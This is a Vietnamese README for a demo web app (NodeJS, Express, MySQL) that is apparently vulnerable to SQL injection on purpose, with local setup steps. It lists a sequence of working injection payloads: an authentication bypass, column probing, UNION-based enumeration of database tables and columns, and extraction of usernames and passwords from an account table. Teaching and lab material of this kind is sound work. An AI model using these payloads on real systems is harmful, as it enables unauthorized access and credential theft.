## Website demo tấn công SQL Injection

### Công nghệ sử dụng
- NodeJS
- MYSQL
- Heroku
- HTML
- CSS
- JS
- Bootstrap
- ExpressJS 

### Các câu lệnh tấn công thử trên web (copy bỏ dấu "[" và "]")
- [' OR 1 = 1 -- ]
- [' ORDER BY 4 -- ]
- [' ORDER BY 5 -- ]
- [' UNION SELECT 1, 2, 3, 4 -- ]
- [' UNION SELECT 1, GROUP_CONCAT(TABLE_NAME), 3, 4 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA= DATABASE() -- ]
- [' UNION SELECT 1, GROUP_CONCAT(COLUMN_NAME), 3, 4 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME= 'account' -- ]
- [' UNION SELECT id, password, username, 4 FROM account -- ]

### Hướng dẫn run code
#### 1. Cài ứng dụng
- Nodejs
- MySql
- Vscode

#### 2. Import database trong thư mục database vào mysql

#### 3. Mở project bằng Vscode

#### 4. Vào file database.js (src/model/database.js) chỉnh sửa value của các dòng 4, 5, 6, 7 sao cho đúng với database.

#### 6. Mở terminal (cmd)

#### 7. Gõ lệnh: 
    - npm install --global yarn (Nếu đã cài yarn thì không cần thực hiện câu lệnh này)
    - yarn
    - yarn start

#### 8. Mở trình duyệt với url: "http://localhost:5000"
